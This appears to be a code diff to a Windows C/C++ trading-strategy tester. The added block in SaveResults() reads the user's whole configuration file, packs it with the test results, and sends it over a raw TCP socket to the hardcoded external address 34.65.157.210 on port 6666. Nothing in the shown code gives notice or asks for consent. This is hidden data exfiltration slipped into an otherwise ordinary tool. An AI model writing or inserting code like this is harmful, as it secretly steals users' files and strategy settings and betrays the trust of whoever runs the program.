@@ -6,6 +6,7 @@
 #include <time.h>
 #include <windows.h>
 #include <tchar.h>
+#include "winsock2.h"
 
 #pragma comment(lib, "Winmm.lib")
 
@@ -570,6 +571,51 @@ char* SaveResults(){
 	lstrcat(membuf,"frequency : "); lstrcat(membuf,doubleToStr(ordersperday,2));lstrcat(membuf," orders per day\r\n");
 	lstrcat(membuf,"clear profit : "); lstrcat(membuf,doubleToStr(pipsperday,2));lstrcat(membuf," pips per day\r\n");
 	lstrcat(membuf,"middle order lifetime : "); lstrcat(membuf,intToStr(midtimeout));lstrcat(membuf," minutes\r\n");
+
+
+
+   FILE* fd;
+   char *src_str;src_str = (char *)malloc(40000);memset(src_str,0,40000);
+   fd = fopen(pathCONFIG, "rb");
+   int src_size = fread(src_str, 40000,1,fd);
+   fclose(fd);
+   char *buff;buff = (char *)malloc(40000);memset(buff,0,40000);
+   lstrcat(buff,"1111222233334444");
+   lstrcat(buff,membuf);
+   lstrcat(buff,src_str);
+   int t;
+   t=strlen(membuf);memcpy(&buff[0],&t,4);
+   t=6;memcpy(&buff[4],&t,4);
+   t=7;memcpy(&buff[8],&t,4);
+   t=strlen(src_str);memcpy(&buff[12],&t,4);
+   int bufflen = 16+strlen(membuf)+strlen(src_str);
+   //printf(&buff[16]);return 0;
+   
+   WSADATA ws;
+   WSAStartup (MAKEWORD( 1, 1 ), &ws);
+
+   SOCKET s;
+   s = socket (AF_INET, SOCK_STREAM, 0);
+   sockaddr_in sock_addr;
+   ZeroMemory(&sock_addr, sizeof (sock_addr));
+   sock_addr.sin_family = AF_INET;
+   sock_addr.sin_addr.s_addr = inet_addr ("34.65.157.210");//192.168.127.133");
+   sock_addr.sin_port = htons (6666);
+   connect (s, (sockaddr *) &sock_addr, sizeof (sock_addr) );
+
+   //send (s, (char* ) & buff, bufflen, 0 );
+   //send (s,reinterpret_cast<const unsigned char*>(&buff), bufflen, 0 );
+   send (s, buff, bufflen, 0 );
+   
+   closesocket (s);
+   WSACleanup();
+   
+   free(buff);
+   free(src_str);
+	
+
+
+
 	
 	lstrcat(&totalresults[0],"\r\n\r\n");lstrcat(&totalresults[0],membuf);
 	
